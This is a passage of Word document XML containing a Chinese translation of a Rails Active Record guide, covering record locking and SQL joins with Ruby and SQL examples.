              <w:t>`item` LIMIT 1 FOR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>UPDATE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1889D69E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Item Update</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(0.4ms)  UPDATE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>`items` SET</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>`updated_at` = `2009-02-07 18:05:56`, `name` = 'Jones'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>`id` = 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AFB2C22" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SQL (0.8ms)  COMMIT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="729A6178" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你还可以传递原始 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句给 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lock</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法来支持不同类型的锁。比如说： MySQL 有一中锁叫做 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>LOCK IN SHARE MODE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，它可以让你对一条记录上锁但是允许其它人读它。要指定这种锁类型，你需要把它作为参数传给 lock 方法：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="73E6487B" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="279A29BD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Item.transaction do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="603FF5ED" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  i = Item.lock("LOCK IN SHARE MODE").find(1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10CA5CC4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  i.increament(:view)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E55929C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64778068" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>如果你已经有一个对象实例了，你可以使用如下代码来一次性地开启一个事务并加锁。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3816"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5085B640" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5785FB02" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>item = Item.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49FB64C7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>item.with_lock do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C55F318" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # 这个代码块在事务里面执行</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="185BC087" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # item 是已经加锁的</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12F5C899" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  item.increment!(:view)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A1D48FB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="34AD92D6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>12 连接表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E6F091" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Record 提供了一个叫做 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>joins</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的查找方法来对结果的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句指定 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>JOIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 子句。Active Record 提供了多种使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>joins</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法的方式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A78F78" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">12.1 使用字符串 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E37A931" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你可以使用原生态的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句来使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>JOIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法以生成 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>joins</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 子句。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="572BDAEA" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="586288ED" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="433332129"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.join('LEFT OUTER JOIN addresses ON addresses.client_id = clients.id')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="487A35A6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会生成如下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3CF35210" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1368F7B3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="700135546"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients.* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients LEFT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>OUTER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>addresses ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>addresses.client_id = clients.id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5DA006F4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>12.2 使用已定义的 Associations 的数组或者映射表形式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F37A1FE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这个方法只适用于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>INTER JOIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的情况。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744E87EE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Record 允许我们使用 model 上定义的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId275" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>associations</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 的名字作为使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>joins</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法时指定连接表的缩写形式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C19C91" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">比如说：看如下关于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Category</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Comments</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Guest</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 几个 model 的例子。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2D2278F2" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35A017C1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Category &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59BC1FFA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2123A3FF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F572FDF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7ED46DBA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3682722E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :category</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4563210F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06F807D5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :tags</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74511F83" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6732DA13" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24E503EA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Comment &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00D3E8E6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C9A7E91" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :guest</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DF677AA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="635984C8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C47C631" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Guest &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="688B4853" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :comment</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4262822D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5828D302" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3133EBB0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Tag &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FE5915C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="150648C5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1E86AB6A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">现在以下所有的语句都会产生相应的使用了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>INNER JOIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的连接查询语句：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6AD0A2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>12.2.1 使用单个 Association</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2856"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3FBD5463" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2FD2A980" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1534683956"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Category.joins(:posts)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D5B3F57" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它会产生如下语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6839"/>
